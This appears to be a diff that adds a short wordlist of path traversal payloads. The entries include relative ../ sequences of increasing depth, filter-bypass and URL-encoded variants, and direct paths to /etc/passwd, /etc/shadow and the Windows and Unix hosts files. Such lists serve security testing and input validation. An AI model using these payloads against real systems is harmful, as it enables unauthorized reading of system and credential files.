@@ -1,0 +1,17 @@
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+....//....//etc/passwd
+....\/....\/etc/passwd
+%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/etc/passwd
+..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/windows/system32/drivers/etc/hosts
